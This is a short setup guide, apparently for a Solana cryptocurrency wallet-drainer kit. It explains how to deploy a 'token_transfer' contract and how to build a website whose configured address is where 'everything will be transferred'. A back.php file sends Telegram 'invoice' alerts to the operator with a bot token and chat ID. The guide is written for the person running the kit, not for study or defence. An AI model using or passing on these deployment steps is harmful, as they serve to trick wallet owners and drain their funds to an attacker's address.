1. Install dependencies:
```bash
npm install
```

2. Create a `.env` file and add to it:
```env
PRIVATE_KEY=your_wallet_private_key
SOLANA_RPC_URL=https://api.mainnet-beta.solana.com

3. Build the project:
```bash
npm run build
```

4. Deploy the contract:
```bash
npm run deploy
```

After successful execution, you will see the address of the created token account COPY THE DEPLOYMENT ADDRESS. 
And paste to solana_fr0nt/target/idl/token_transfer.json

## Possible errors and their solutions:

1. "Insufficient gas for contract deployment"
- Solution: Make sure that the wallet has enough SOL for deployment. usually deploy contract requires 2-3 sol fee in solana network
i advise you to keep a little more to cover all fees

2. "Private key not found in .env file"
- Solution: Check the presence and correctness of the private key in the .env file

3. "Cannot find module"
- Solution: Reinstall dependencies: `npm install`


        ◦ Instruction - Website Build
    1. Open the terminal, navigate to the site-reactjs folder (cd /../../site-reactjs)
    2. Install yarn by typing "yarn" or npm
    3. Install dependencies  -   npm i 
    4. Set up the wallet - const toPubkey = ""; // address where everything will be transferred (src/App.js)
    5. ONLY PERFORM THIS STEP IF YOU'RE DEPLOYING A NEW CONTRACT Replace the address in token_transfer.json on line 314 if you've deployed a new contract
"address": "7XRYEDuRarTud1pCBWgNoW52LhK2dXoVR8rbcvwZfuki" // replace in the second pair of quotes accordingly (instructions in contract deployment)
    6. Next, compile the site with the command - "yarn build"
    7. Done.
	
	
	tg invoice in public\back.php CHANGE AT YOU BOT API AND YOUR USER ID
const TELEGRAM_TOKEN = 'YOUR-BOT-API';
const TELEGRAM_CHATID = 'YOUR-ID';